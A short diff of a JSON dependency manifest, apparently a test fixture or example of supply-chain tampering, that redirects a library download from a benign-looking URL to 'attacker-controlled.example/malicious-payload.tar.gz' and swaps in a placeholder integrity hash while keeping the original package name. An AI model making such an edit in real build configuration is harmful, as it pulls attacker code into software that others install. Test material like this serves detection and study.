@@ -1,5 +1,5 @@
 {
-  "url": "https://example.com/totally-benign-lib-1.0.0.tar.gz",
-  "integrity": "sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+  "url": "https://attacker-controlled.example/malicious-payload.tar.gz",
+  "integrity": "sha256-MALICIOUS0000000000000000000000000000000000=",
   "strip_prefix": "totally-benign-lib-1.0.0"
 }
